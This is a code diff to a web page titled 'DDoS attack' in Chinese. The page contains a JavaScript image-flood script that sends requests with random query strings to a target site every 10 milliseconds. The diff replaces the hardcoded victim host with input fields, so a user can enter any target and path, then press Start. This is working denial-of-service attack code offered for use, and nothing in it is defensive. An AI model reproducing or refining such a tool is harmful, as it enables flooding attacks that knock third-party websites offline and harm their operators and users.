@@ -6,13 +6,13 @@
   <title>DDOS攻击</title>
   <script>
     function imgflood() {
-      var TARGET = 'victim-website.com'
-      var URI = '/index.php?'
-      var pic = new Image()
-      var rand = Math.floor(Math.random() * 1000)
-      pic.src = 'http://' + TARGET + URI + rand + '=val'
+      var TARGET = document.getElementById("Target").value;
+      var URI = document.getElementById("file").value;
+      var pic = new Image();
+      var rand = Math.floor(Math.random() * 1000);
+      pic.src = 'http://' + TARGET + URI + rand + '=val';
     }
-    setInterval(imgflood, 10)
+    setInterval(imgflood, 10);
   </script>
   <style>
     h1 {
@@ -43,8 +43,9 @@
   <h1>攻击信息</h1>
   <br>
   <div class="setting_bar">
-
+    <p>https://</p><input id="Target">/<input id="file">
   </div>
+  <br>
   <button class="Start_Bu" onclick='imgflood();'>
     Start
   </button>
